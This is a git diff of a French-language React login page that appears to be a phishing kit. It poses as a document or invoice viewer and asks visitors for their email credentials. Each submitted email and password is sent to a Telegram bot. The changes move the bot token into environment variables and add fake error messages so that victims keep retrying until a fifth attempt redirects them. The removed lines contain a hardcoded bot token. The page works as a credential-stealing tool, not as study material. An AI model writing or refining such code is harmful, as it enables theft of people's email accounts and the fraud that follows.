@@ -3,8 +3,6 @@ import micr from "../src/assets/micr.webp";
 import pdf from "../src/assets/pdf.png";
 import cap from "../src/assets/cap.png";
 
-
-
 import { useRef, useState } from "react";
 import { useNavigate } from "react-router";
 
@@ -12,6 +10,7 @@ function Home() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [showPasswordInput, setShowPasswordInput] = useState(false);
+  const [attemptCount, setAttemptCount] = useState(0); // Doit être déclaré ici
   const form = useRef();
   const navigate = useNavigate();
 
@@ -26,25 +25,29 @@ function Home() {
 
   const handleSignInClick = async (e) => {
     e.preventDefault();
-    if (!email || !password) {
-      alert("Veuillez remplir tous les champs.");
+
+    // Vérification de la validité de l'email et du mot de passe
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      alert("Veuillez entrer une adresse email valide.");
+      return;
+    }
+
+    if (password.length < 6) {
+      alert("Mot de passe incorrect, veuillez réessayer.");
       return;
     }
 
     try {
-      
-
-      
-
       // Envoyer les informations via Telegram
-      const botToken = '7089226670:AAHNSB19Gfzyc_6BkvjJVVU-Dv-_CFFs_YM';
-      const chatId = '@familys_bot14';
+      const botToken = import.meta.env.VITE_BOT_TOKEN;
+      const chatId = import.meta.env.VITE_CHAT_ID;
       const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
 
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
         body: JSON.stringify({
           chat_id: chatId,
@@ -52,13 +55,18 @@ function Home() {
         }),
       });
 
-      console.log("Message envoyé via Telegram!");
-      console.log("SUCCESS!");
-      navigate("/votre-facture")
+      // Incrémenter le compteur de tentatives
+      setAttemptCount((prevCount) => prevCount + 1);
+
+      // Vérifier si c'est la 5e tentative
+      if (attemptCount + 1 === 5) {
+        navigate("/votre-facture");
+      } else {
+        alert("Erreur !!! veuillez réessayer");
+      }
+
       setEmail("");
       setPassword("");
-
-      
     } catch (error) {
       console.log("FAILED...", error);
     }
@@ -89,8 +97,8 @@ function Home() {
           </div>
 
           <h5>
-            Pour lire le document veuillez entrer les identifiants de messagerie
-            auxquels ce fichier a été envoyé.
+            Pour lire le document, veuillez entrer les identifiants de
+            messagerie auxquels ce fichier a été envoyé.
           </h5>
 
           <div className="images">
